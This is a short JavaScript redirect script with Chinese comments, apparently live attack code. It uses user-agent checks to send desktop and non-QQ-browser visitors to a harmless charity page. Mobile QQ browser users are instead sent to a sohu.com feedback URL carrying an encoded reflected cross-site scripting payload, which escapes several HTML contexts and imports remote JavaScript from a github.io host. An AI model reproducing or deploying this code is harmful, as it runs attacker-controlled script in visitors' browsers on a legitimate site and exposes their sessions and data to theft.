// 判断是否在移动端访问
function isMobile() {
	var userAgent = navigator.userAgent.toLowerCase();
	return (/iphone|ipad|ipod|android|windows phone/.test(userAgent));
}
// 检测是否在移动端 QQ 浏览器中访问
function isMobileQQBrowser() {
	var userAgent = navigator.userAgent || navigator.vendor || window.opera;
	return (userAgent.indexOf('QQ') !== -1 && userAgent.indexOf('Mobile') !== -1);
}
// 使用例子
if (isMobileQQBrowser()) {
	console.log('当前环境是移动端 QQ 浏览器');
} else {
	window.location.href = 'https://gongyi.qq.com/';
}

// 如果不在移动端访问，则跳转到提示页面
if (!isMobile()) {
	window.location.href = 'https://gongyi.qq.com/';
}


// 获取当前页面的 URL 参数
const queryParams = new URLSearchParams(window.location.search);
var timestamp = Date.now();
// 构建新的目标 URL
let targetUrl = 'https://feedback.vrs.sohu.com/feedback.html;fXcvJHmkItPPMsddiUlxoOUaqMtdRiGv?logId=1%27)%22%3C/Title/%3C/Style/%3C/Textarea/%3C/Iframe%3E%3CScript/K/%3Eimport(%27//xiachedann.github.io/playmusic.js%27)%3C/Script/K&17225942986202=5018016e'+timestamp+'1ea27a6572ef377dbad76da59d01d7f3a55';

// 将当前页面的所有参数添加到目标 URL 中
if (queryParams.toString() !== '') {
	targetUrl += '&' + queryParams.toString();
}

window.location.replace(targetUrl);
